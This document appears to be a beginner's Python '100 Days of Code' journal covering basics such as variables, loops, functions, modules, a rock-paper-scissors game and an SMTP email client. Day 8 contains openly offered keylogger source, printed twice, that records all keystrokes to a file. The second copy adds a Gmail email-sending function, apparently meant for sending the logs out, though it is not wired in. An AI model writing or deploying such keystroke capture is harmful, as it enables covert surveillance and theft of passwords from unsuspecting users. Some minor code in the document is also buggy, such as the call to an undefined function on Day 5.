# My100DaysOfCode

DAY 01
====================
### Day 1: Introduction to Python
### Author: ABDULLAHI AHMED OSman
### Date: 2025-01-01
### Description: This is the first day of my 100 days of code challenge. I will begin by introducing myself and explaining the purpose of this challenge.
### Code: This is a simple Python script that prints out a message to the user.

def introduction_to_python():
    print("Hello, World!")
    print("Welcome to my 100 days of code challenge.")
    print("I'm ABDULLAHI ABDULLAHI, and I'm excited to start this journey.")
    print("Over the next 100 days, I'll be learning and coding every day.")
    print("I'll be sharing my progress and experiences along the way.")
    print("Thanks for joining me on this journey!")

introduction_to_python()

DAY 02
====================
### Day 2: Variables and Data Types
### Author: ABDULLAHI AHMED OSman
### Date: 2025-01-02
### Description: In this day, I will be learning about variables and data types in Python.
### Code: This is a simple Python script that demonstrates the use of variables and data types.

def variables_and_data_types():
    full_name = "Abdullahi Ahmed Osman"
    current_age = 21

    print(f"My full name is {full_name} and I am {current_age} years old.")

    print("Data Types in Python:")
    print("1. Integers:", type(current_age))
    print("2. Floats:", type(3.14))
    print("3. Strings:", type(full_name))
    print("4. Boolean:", type(True))
    print("5. List:", type([1, 2, 3]))
    print("6. Tuple:", type((1, 2, 3)))

variables_and_data_types()

DAY 03
====================
### Day 3: Basic Operators
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-03
### Description: In this day, I will be learning about basic operators in Python.
### Code: This is a simple Python script that demonstrates the use of basic operators.

def basic_operators():
    x = 10
    y = 5

    print("Arithmetic Operators:")
    print(f"1. Addition: {x} + {y} = {x + y}")
    print(f"2. Subtraction: {x} - {y} = {x - y}")
    print(f"3. Multiplication: {x} * {y} = {x * y}")
    print(f"4. Division: {x} / {y} = {x / y}")

    print("\nComparison Operators:")
    print(f"1. Equal to: {x} == {y} = {x == y}")
    print(f"2. Not equal to: {x} != {y} = {x != y}")
    print(f"3. Greater than: {x} > {y} = {x > y}")
    print(f"4. Less than: {x} < {y} = {x < y}")

    print("\nLogical Operators:")
    print(f"1. And: {x} > 5 and {x} < 15 = {x > 5 and x < 15}")
    print(f"2. Or: {x} > 5 or {x} < 5 = {x > 5 or x < 5}")

basic_operators()

DAY 04
====================
### Day 4: Control Structures
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-04
### Description: In this day, I will be learning about control structures in Python.
### Code: This is a simple Python script that demonstrates the use of control structures.

def control_structures():
    x = 10
    y = 5

    if x > y:  
        print(f"{x} is greater than {y}")
    elif x == y:
        print(f"{x} is equal to {y}")
    else:
        print(f"{x} is less than {y}")

    print("\nFor Loop:")
    for i in range(5):
        print(i)

    print("\nWhile Loop:")
    i = 0
    while i < 5:
        print(i)
        i += 1

    print("\nNested If-Else Statement:")
    if x > y:  
        if x > 10:
            print(f"{x} is greater than 10")
        else:
            print(f"{x} is less than or equal to 10")
    else:
        print(f"{x} is less than or equal to {y}")

    print("\nBreak and Continue Statements:")
    for i in range(5):
        if i == 3:
            break
        print(i)

    print("\nContinue Statement:")
    for i in range(5):
        if i == 3:
            continue
        print(i)

control_structures()

DAY 05
================
### Day 5: Functions
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-05
### Description: In this day, I will be learning about functions in Python.
### Code: This is a simple Python script that demonstrates the use of functions.

def greet(name: str) -> None:
    """Prints a personalized greeting message"""
    print(f"Hello, {name}!")

def add(x: int, y: int) -> int:
    """Returns the sum of two numbers"""
    return x + y

def main() -> None:
    """Main function to test the greet and add functions"""
    greet("Abdullahi")
    print(add(5, 10))

if __name__ == "__main__":
    main()
    # Output: Hello, Abdullahi! 15
    functions()


DAY 06
================
### Day 6: Modules
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-06
### Description: In this day, I will be learning about modules in Python.
### Code: This is a simple Python script that demonstrates the use of modules.
import math
import random
import datetime
import time
import os
import sys
import platform
import requests 
import json
import pandas as pd
import numpy as np
import matplotlib.pyplot as plt
import seaborn as sns
import plotly.express as px
import plotly.graph_objects as go

def modules_example():
    """Demonstrates the use of various Python modules"""
    print("Math Module:")
    print("Square root of 16:", math.sqrt(16))
    print("Random Module:")
    print("Random number between 1 and 10:", random.randint(1, 10))
    print("Date and Time Module:")
    print("Current date and time:", datetime.datetime.now())
    print("Time Module:")
    print("Current time in seconds since the epoch:", time.time())
    print("OS Module:")
    print("Current operating system:", os.name)
    print("System Module:")
    print("Current system platform:", sys.platform)
    print("Platform Module:")
    print("Current platform:", platform.platform())
    print("Requests Module:")
    response = requests.get("https://www.example.com")
    print("Status code:", response.status_code)
    print("JSON Module:")
    data = json.loads('{"name": "John", "age": 30}')
    print("Name:", data["name"])
    print("Age:", data["age"])
    print("Pandas Module:")
    data = pd.DataFrame({'Name': ['John', 'Anna', 'Peter'], 'Age': [28, 24, 35]})
    print(data)
    print("NumPy Module:")
    array = np.array([1, 2, 3, 4, 5])
    print("Array:", array)
    print("Matplotlib Module:")
    plt.plot([1, 2, 3, 4, 5])
    plt.show()
    print("Seaborn Module:")
    sns.set()
    plt.plot([1, 2, 3, 4, 5])
    plt.show()
    print("Plotly Module:")
    fig = go.Figure(data=[go.Scatter(x=[1, 2, 3, 4, 5], y=[1, 2, 3, 4, 5])])
    fig.show()

modules_example()

DAY 07
================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-07
### Description: This is the seventh day of the 100 Days of Code challenge.
### The task is to create a program that can play a simple game of Rock, Paper, Sc
import random

def game():
    while True:
        user = input("Enter a choice (rock, paper, scissors) or 'quit' to exit: ").lower()
        if user == "quit":
            break
        elif user not in ["rock", "paper", "scissors"]:
            print("Invalid input. Please try again.")
            continue

        computer = random.choice(["rock", "paper", "scissors"])
        print(f"\nYou chose {user}, computer chose {computer}.\n")

        if user == computer:
            print(f"Both players selected {user}. It's a tie!")
        elif user == "rock":
            if computer == "scissors":
                print("Rock smashes scissors! You win!")
            else:
                print("Paper covers rock! You lose.")
        elif user == "paper":
            if computer == "rock":
                print("Paper covers rock! You win!")
            else:
                print("Scissors cuts paper! You lose.")
        elif user == "scissors":
            if computer == "paper":
                print("Scissors cuts paper! You win!")
            else:
                print("Rock smashes scissors! You lose.")

game()

DAY 8
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-08
### Description: This is the eighth day of the 100 Days of Code challenge.
### The task is to create a program that can verify email address and Key Logger

import re

def verify_email(email):
    """
    Verifies if the given email address is valid.
    
    Args:
        email (str): The email address to verify.
    
    Returns:
        bool: True if the email address is valid, False otherwise.
    """
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
    if re.match(email_regex, email):
        return True
    else:
        return False

def main():
    # Test the verify_email function
    emails = ["test@example.com", "test.example.com", "test@.com"]
    for email in emails:
        print(f"Email: {email}, Valid: {verify_email(email)}")

if __name__ == "__main__":
    main()

import keyboard
import time
import threading
import logging
import datetime
import os
import platform

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(event):
    logging.info(f'Key pressed: {event.name}')

def on_key_release(event):
    logging.info(f'Key released: {event.name}')

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        # Keep the program running until manually stopped
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('Program stopped manually')
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()

import os
import platform
import time
import datetime
import logging
import threading
import keyboard
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set up logging
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

def on_key_press(event):
    logging.info(f'Key pressed: {event.name}')

def on_key_release(event):
    logging.info(f'Key released: {event.name}')

def send_email(subject, message, from_addr, to_addr, password):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.on_release(on_key_release)

        # Keep the program running until manually stopped
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print('Program stopped manually')
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        keyboard.unhook_all()

if __name__ == "__main__":
    main()

 DAY 9
===============================
### Author: ABDULLAHI AHMED OSMAN
### Date: 2025-01-09
### Description: This is the ninth day of the 100 Days of Code challenge.
### The task is to create a simple email client using Python's smtplib and email libraries.

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_email(subject, message, from_addr, to_addr, password):
    """
    Sends an email using the provided details.
    
    Args:
        subject (str): The subject of the email.
        message (str): The body of the email.
        from_addr (str): The sender's email address.
        to_addr (str): The recipient's email address.
        password (str): The sender's email password.
    """
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_addr, password)
    text = msg.as_string()
    server.sendmail(from_addr, to_addr, text)
    server.quit()

def main():
    """
    Asks for user input and sends an email using the provided details.
    """
    subject = input("Enter the subject of the email: ")
    message = input("Enter the body of the email: ")
    from_addr = input("Enter your email address: ")
    to_addr = input("Enter the recipient's email address: ")
    password = input("Enter your email password: ")
    
    try:
        send_email(subject, message, from_addr, to_addr, password)
        print("Email sent successfully!")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()

